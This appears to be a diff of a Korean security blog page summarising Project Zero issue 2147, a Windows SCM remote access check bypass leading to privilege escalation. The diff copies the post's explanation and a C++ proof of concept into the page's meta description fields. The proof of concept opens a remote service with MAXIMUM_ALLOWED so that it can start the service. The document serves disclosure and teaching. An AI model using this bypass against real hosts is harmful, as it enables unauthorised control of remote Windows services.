@@ -13,15 +13,165 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/detail?id=2147&#34;&gt;Issue 2147: Windows: SCM Remote Access Check Limit Bypass EoP&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Windows 10 20H2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Windows 10 1709 &amp;#xC774;&amp;#xD6C4; &amp;#xC6D0;&amp;#xACA9;&amp;#xC73C;&amp;#xB85C; local admin group&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xC6D0;&amp;#xACA9; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &lt;code&gt;SCM&lt;/code&gt; &amp;#xBC0F; &lt;code&gt;service access&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; local &amp;#xAD00;&amp;#xB9AC;&amp;#xC790; &amp;#xADF8;&amp;#xB8F9;&amp;#xC5D0; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;OpenSCManager&lt;/code&gt; &amp;#xB610;&amp;#xB294; &lt;code&gt;OpenService&lt;/code&gt;&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;Access mask&lt;/code&gt;&amp;#xAC00; &lt;code&gt;0xD0072&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &lt;code&gt;ScAccessCheckAndAudit&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC80;&amp;#xC0AC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; access mask&amp;#xC5D0; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; SCM&amp;#xC774; &lt;code&gt;access denied error&lt;/code&gt;&amp;#xC640; &amp;#xD568;&amp;#xAED8; &amp;#xAC70;&amp;#xC808;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &lt;code&gt;SERVICE_START&lt;/code&gt; &amp;#xD639;&amp;#xC740; &lt;code&gt;SC_MANAGER_CREATE_SERVICE&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC740; RPC &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NtAccessCheckAndAuditAlarm&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xACE0; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC740; &lt;code&gt;Service Handle&lt;/code&gt;&amp;#xC5D0; &amp;#xB2E4;&amp;#xC2DC; &amp;#xAE30;&amp;#xB85D;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC774; &amp;#xAC80;&amp;#xC99D;&amp;#xC740; &lt;code&gt;MAXIMUM_ALLOWED&lt;/code&gt;&amp;#xB97C; request &amp;#xD568;&amp;#xC73C;&amp;#xB85C;&amp;#xC368; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. POC &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-comment&#34;&gt;#include &amp;lt;windows.h&amp;gt;&lt;/span&gt;
+
+int wmain(int argc, wchar_t** argv)
+{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (argc &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: HostName ServiceName\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+    }
+
+    auto scm = OpenSCManager(argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], nullptr, MAXIMUM_ALLOWED);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (scm == nullptr)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Failed to open SCM error:%d\\n&amp;quot;&lt;/span&gt;, GetLastError());
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    auto service = OpenService(scm, argv[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], SERVICE_START);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (service)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Was granted SERVICE_START when we didn&amp;apos;t expect it. Maybe using the wrong user?\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    DWORD error = GetLastError();
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (error == ERROR_SERVICE_DOES_NOT_EXIST)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Service doesn&amp;apos;t exist.\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (error != ERROR_ACCESS_DENIED)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Expected ERROR_ACCESS_DENIED but got %d, the rest might not work.\\n&amp;quot;&lt;/span&gt;, GetLastError());
+    }
+
+    service = OpenService(scm, argv[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], MAXIMUM_ALLOWED);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (service == nullptr)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Failed to open service error:%d\\n&amp;quot;&lt;/span&gt;, GetLastError());
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    error = ERROR_SUCCESS;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!StartService(service, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, nullptr))
+    {
+        error = GetLastError();
+    }
+
+    switch (error)
+    {
+        case ERROR_ACCESS_DENIED:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Got access denied error.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        case ERROR_SUCCESS:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[SUCCESS]: Successfully started service.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        case ERROR_SERVICE_DISABLED:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[SUCCESS]: Service was disabled but passed the access check.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        default:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[WARNING]: Didn&amp;apos;t start service but didn&amp;apos;t get back expected error:%d\\n&amp;quot;&lt;/span&gt;, error);
+    }
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Windows SCM Remote Access Check Limit Bypass EoP - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/detail?id=2147&#34;&gt;Issue 2147: Windows: SCM Remote Access Check Limit Bypass EoP&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Windows 10 20H2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Windows 10 1709 &amp;#xC774;&amp;#xD6C4; &amp;#xC6D0;&amp;#xACA9;&amp;#xC73C;&amp;#xB85C; local admin group&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xC6D0;&amp;#xACA9; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &lt;code&gt;SCM&lt;/code&gt; &amp;#xBC0F; &lt;code&gt;service access&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; local &amp;#xAD00;&amp;#xB9AC;&amp;#xC790; &amp;#xADF8;&amp;#xB8F9;&amp;#xC5D0; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;OpenSCManager&lt;/code&gt; &amp;#xB610;&amp;#xB294; &lt;code&gt;OpenService&lt;/code&gt;&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;Access mask&lt;/code&gt;&amp;#xAC00; &lt;code&gt;0xD0072&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &lt;code&gt;ScAccessCheckAndAudit&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC80;&amp;#xC0AC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; access mask&amp;#xC5D0; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; SCM&amp;#xC774; &lt;code&gt;access denied error&lt;/code&gt;&amp;#xC640; &amp;#xD568;&amp;#xAED8; &amp;#xAC70;&amp;#xC808;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &lt;code&gt;SERVICE_START&lt;/code&gt; &amp;#xD639;&amp;#xC740; &lt;code&gt;SC_MANAGER_CREATE_SERVICE&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9; &amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC740; RPC &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NtAccessCheckAndAuditAlarm&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xACE0; access &amp;#xAD8C;&amp;#xD55C;&amp;#xC740; &lt;code&gt;Service Handle&lt;/code&gt;&amp;#xC5D0; &amp;#xB2E4;&amp;#xC2DC; &amp;#xAE30;&amp;#xB85D;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC774; &amp;#xAC80;&amp;#xC99D;&amp;#xC740; &lt;code&gt;MAXIMUM_ALLOWED&lt;/code&gt;&amp;#xB97C; request &amp;#xD568;&amp;#xC73C;&amp;#xB85C;&amp;#xC368; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. POC &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-comment&#34;&gt;#include &amp;lt;windows.h&amp;gt;&lt;/span&gt;
+
+int wmain(int argc, wchar_t** argv)
+{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (argc &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: HostName ServiceName\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+    }
+
+    auto scm = OpenSCManager(argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], nullptr, MAXIMUM_ALLOWED);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (scm == nullptr)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Failed to open SCM error:%d\\n&amp;quot;&lt;/span&gt;, GetLastError());
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    auto service = OpenService(scm, argv[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], SERVICE_START);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (service)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Was granted SERVICE_START when we didn&amp;apos;t expect it. Maybe using the wrong user?\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    DWORD error = GetLastError();
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (error == ERROR_SERVICE_DOES_NOT_EXIST)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Service doesn&amp;apos;t exist.\\n&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (error != ERROR_ACCESS_DENIED)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Expected ERROR_ACCESS_DENIED but got %d, the rest might not work.\\n&amp;quot;&lt;/span&gt;, GetLastError());
+    }
+
+    service = OpenService(scm, argv[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], MAXIMUM_ALLOWED);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (service == nullptr)
+    {
+        printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Failed to open service error:%d\\n&amp;quot;&lt;/span&gt;, GetLastError());
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+
+    error = ERROR_SUCCESS;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!StartService(service, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, nullptr))
+    {
+        error = GetLastError();
+    }
+
+    switch (error)
+    {
+        case ERROR_ACCESS_DENIED:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[ERROR]: Got access denied error.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        case ERROR_SUCCESS:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[SUCCESS]: Successfully started service.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        case ERROR_SERVICE_DISABLED:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[SUCCESS]: Service was disabled but passed the access check.\\n&amp;quot;&lt;/span&gt;);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+        default:
+            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[WARNING]: Didn&amp;apos;t start service but didn&amp;apos;t get back expected error:%d\\n&amp;quot;&lt;/span&gt;, error);
+    }
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/04/15/insu/2021-04-15/">
@@ -316,7 +466,6 @@ int wmain(int argc, wchar_t** argv)
     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 }</code></pre>
 
-
             </div>
             <hr>
             <div>
@@ -333,15 +482,15 @@ int wmain(int argc, wchar_t** argv)
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/eop/">eop</a>
+                  <a class="hover-with-bg" href="/tags/insu/">insu</a>
                   
                   <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
+                  <a class="hover-with-bg" href="/tags/scm/">scm</a>
+                  
                   <a class="hover-with-bg" href="/tags/bypass/">bypass</a>
                   
-                  <a class="hover-with-bg" href="/tags/insu/">insu</a>
-                  
-                  <a class="hover-with-bg" href="/tags/scm/">scm</a>
+                  <a class="hover-with-bg" href="/tags/eop/">eop</a>
                   
                 </div>
                 
@@ -380,9 +529,9 @@ int wmain(int argc, wchar_t** argv)
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2021/04/15/idioth/2021-04-15/">
+                  <a href="/2021/04/16/l0ch/2021-04-16/">
                     <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</span>
+                    <span class="hidden-mobile">[하루한줄] CVE-2021-27850: Apache Tapestry CVE-2019-0195 Bypass </span>
                     <span class="visible-mobile">Previous</span>
                   </a>
                   
@@ -390,8 +539,8 @@ int wmain(int argc, wchar_t** argv)
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2021/04/14/fabu1ous/2021-04-14/">
-                    <span class="hidden-mobile">[하루한줄] BleedingTooth: Zero-Click RCE</span>
+                  <a href="/2021/04/15/idioth/2021-04-15/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
